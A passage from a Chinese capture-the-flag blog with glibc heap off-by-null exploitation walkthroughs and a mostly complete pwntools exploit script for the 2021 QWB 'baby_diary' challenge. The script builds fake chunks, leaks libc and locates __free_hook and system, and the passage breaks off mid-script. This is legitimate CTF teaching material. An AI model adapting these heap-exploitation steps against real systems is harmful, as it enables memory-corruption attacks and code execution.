<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">11</span>)  <span class="comment">#0x---2b0</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#0x---c20</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">&#x27;PIG007nb&#x27;</span>)  <span class="comment"># 12 0x---c20 to overflow \x00 in fd</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x13&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 13 0x---c20</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-06-10.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-03-45.png" alt="img"></p>
<p>(2)修复bk：首先进入Unsortedbin中踩地址</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-43-09.png" alt="img"></p>
<p>没啥问题 ，但是申请回来的时候有点大问题：</p>
<p>①如果先申请0x—c20，那么就会使得unsortedbin中顺序变为：</p>
<p>0x—150 -&gt; main_arena+96，导致原先的0x—150.fd被修改，无法完成修复。</p>
<p>②如果先申请0x—150，那么由于unsortedbin机制，依据fd遍历，就会先遍历到0x—c20，导致0x—c20解链放入largebin中，unsortedbin中的情况和先申请0x—c20是一样的，先变成0x—150 -&gt; main_arena+96，然后才会返回0x—150，fd都会被改。</p>
<p>▲所以先将这两个chunk放入largebin中，依据largebin的机制，由于这两个chunk的大小不同，直接申请对应大小就能得到对应的chunk，同时由于largebin排列依据从大到小，申请时也是先遍历大小再遍历fd，如果所需大小的链中只有该chunk，直接返回。所以就可以申请一个大chunk，将这两个chunk都放入largebin中，顺序为：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9F8</span>,<span class="string">&#x27;\x14&#x27;</span>) <span class="comment"># 14 chunk into largebin</span></span><br></pre></td></tr></table></div></figure>

<p>同时这个大chunk也是之后需要触发的off-by-null的chunk</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-52-36.png" alt="img"></p>
<p>之后再申请0x—150大小的chunk就能直接得到了，现在就修复完fd和bk了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># 15 partial overwrite fd</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-56-22.png" alt="img"></p>
<p>6.最后用off-by-null来设置触发chunk的size位</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x77&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0xb90</span>))</span><br><span class="line">free(<span class="number">14</span>)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-08.png" alt="img"></p>
<p>满足所有条件，释放</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-27.png" alt="img"></p>
<p>可以看到top_chunk已经向上合并到0x—c00了，之后就具体的具体分析就完事了。</p>
<p>▲最后贴个简单的exp，只是布局的：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>-<span class="number">0x8</span>-<span class="number">0xf0</span>,<span class="string">&#x27;padd&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x410</span>) <span class="comment">#1 fd 0x---2b0</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\x02*0x100&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x03&#x27;</span>*<span class="number">0x410</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x438</span>,<span class="string">&#x27;\x04&#x27;</span>*<span class="number">0x430</span>) <span class="comment">#4 unlink_chunk 0x---c00</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\x05&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x06&#x27;</span>*<span class="number">0x420</span>) <span class="comment">#6 bk 0x---150</span></span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&#x27;\x07&#x27;</span>*<span class="number">0x200</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#left fd bk in 0x---c00</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#merge and carve to get 0x---c20 and change size which in 0x---c00 </span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">&#x27;\x08&#x27;</span>*<span class="number">0x418</span> + p64(<span class="number">0xb91</span>)) <span class="comment">#8 set size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#reply</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x09&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 9 0x---c20</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x10&#x27;</span>*<span class="number">0x420</span>) <span class="comment"># 10 bk 0x---150</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 11 fd 0x---2b0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#repair fd</span></span><br><span class="line">free(<span class="number">11</span>) <span class="comment">#0x---2b0</span></span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#0x---c20</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">&#x27;PIG007nb&#x27;</span>) <span class="comment"># 12 0x---2b0 to overflow \x00 in fd</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x13&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 13 0x---c20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#repair bk</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x9F8</span>,<span class="string">&#x27;\x14&#x27;</span>*<span class="number">0x9f0</span>) <span class="comment"># let 0x---150 0x---c20 into largebin</span></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># 15 0x---150 to overflow \x00 in fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger off-by-null</span></span><br><span class="line"><span class="comment">#add(0x418,&#x27;\x16&#x27;*0x410) # 16 c20</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x77&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0xb90</span>))</span><br><span class="line">free(<span class="number">14</span>)</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/2021-QWB/">2021-QWB</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、baby_diary</p>
<p>2.31下的off-by-null，多溢出半个字节，所以总共需要爆破一个字节。这里还需要绕过read的检查，不过我这个布局完之后刚好可以通过，也就没太管了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./baby_diary&quot;</span></span><br><span class="line">libc_file = <span class="string">&quot;./libc-2.31.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="comment">#32bit:malloc_hook = main_arena-0x18</span></span><br><span class="line"><span class="comment">#32bit:main_arena+56(unsortedbin_addr)</span></span><br><span class="line"><span class="comment">#64bit:main_arena+96(unsortedbin_addr)//88 aslo have</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;)        #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(binary)</span></span><br><span class="line">    p = process(binary, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.31.so&quot;</span>&#125;)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;49153&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)  </span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt; &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, con</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sla(<span class="string">&quot;content: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(1)前期准备加堆布局:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 0-6</span></span><br><span class="line">        add(<span class="number">0x2000</span>-<span class="number">1</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    add(<span class="number">0x2000</span>-<span class="number">0x1410</span>-<span class="number">0x40</span>-<span class="number">1</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;tcache&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#crux chunk15</span></span><br><span class="line">    add(<span class="number">0xb20</span>-<span class="number">1</span>, <span class="string">&quot;largebin&quot;</span>) <span class="comment"># 15</span></span><br><span class="line">    <span class="comment">#prevent merge</span></span><br><span class="line">    add(<span class="number">0x10</span>-<span class="number">1</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(2)制作fake_chunk，利用largebin踩下fd_nextsize和bk_nextsize:</span></span><br><span class="line">    delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#chunk15 to largebin</span></span><br><span class="line">    add(<span class="number">0x1000</span>-<span class="number">1</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#15</span></span><br><span class="line">    <span class="comment">#make fake_chunk in chunk17</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, p64(<span class="number">0x6</span>) + p64(<span class="number">0x601</span>) + p8(<span class="number">0x40</span>)) <span class="comment">#17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(3)联动fastbin和smallbin：</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x18&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\xaa&#x27;</span>) <span class="comment"># 19</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x20&#x27;</span>) <span class="comment"># 20</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x21&#x27;</span>) <span class="comment"># 21</span></span><br><span class="line">    <span class="comment"># fill in tcache(0x30)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        delete(<span class="number">8</span> + i)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">20</span>)</span><br><span class="line">    delete(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clear tcache(0x30)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x08&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin to smallbin</span></span><br><span class="line">    add(<span class="number">0x400</span>-<span class="number">1</span>, <span class="string">&#x27;\x20&#x27;</span>) <span class="comment">#18</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get chunk18 from smallbin ,chunk20 to tcache</span></span><br><span class="line">    <span class="comment"># change chunk18-&gt;bk to point to fake_chunk</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, p64(<span class="number">0</span>) + p8(<span class="number">0x20</span>)) <span class="comment">#20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(4)利用fastbin修改chunk17-&gt;fd：</span></span><br><span class="line">    <span class="comment"># clear chunk from tcache</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;clear&#x27;</span>) <span class="comment"># 21 from tcache </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        delete(<span class="number">8</span> + i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># free to fastbin</span></span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">        add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&#x27;\x08&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change chunk17-&gt;fd to point to fake_chunk</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, p8(<span class="number">0x20</span>)) <span class="comment">#17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#(5)触发off-by-null:</span></span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>, <span class="string">&quot;\x19&quot;</span>)<span class="comment"># 19 from fastbin</span></span><br><span class="line">    show(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x108</span>-<span class="number">1</span>, <span class="string">&quot;\x23&quot;</span>) <span class="comment"># 23 cutting from chunk15 in unsortebin,for overwrite</span></span><br><span class="line">    add(<span class="number">0x518</span>-<span class="number">1</span>, <span class="string">&quot;\x24&quot;</span>) <span class="comment"># 24 legacy from chunk15 in unsortebin,for trigger off-by-null</span></span><br><span class="line">    <span class="comment">#add(0x100-1, &quot;padding&quot;) # 24</span></span><br><span class="line">    <span class="comment"># off-by-null </span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">23</span>)</span><br><span class="line">    add(<span class="number">0x108</span>-<span class="number">1</span>,p64(<span class="number">0x0</span>)*<span class="number">0x21</span>)</span><br><span class="line">    delete(<span class="number">23</span>)</span><br><span class="line">    add(<span class="number">0x108</span>-<span class="number">1</span>,p64(<span class="number">0x0</span>)*<span class="number">0x1f</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">7</span>+<span class="string">&quot;\x06&quot;</span>)</span><br><span class="line">    <span class="comment">#edit(22, &quot;a&quot;*0x20 + p64(0x520))</span></span><br><span class="line">    <span class="comment"># trigger</span></span><br><span class="line">    delete(<span class="number">24</span>)</span><br><span class="line">    add(<span class="number">0x4e8</span>-<span class="number">1</span>,<span class="string">&quot;padding&quot;</span>)</span><br><span class="line">    show(<span class="number">23</span>)</span><br><span class="line">    ru(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    main_arena = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">96</span></span><br><span class="line">    malloc_hook = main_arena-<span class="number">0x10</span></span><br><span class="line">    libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;system_addr:0x%x&quot;</span>%system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">24</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span 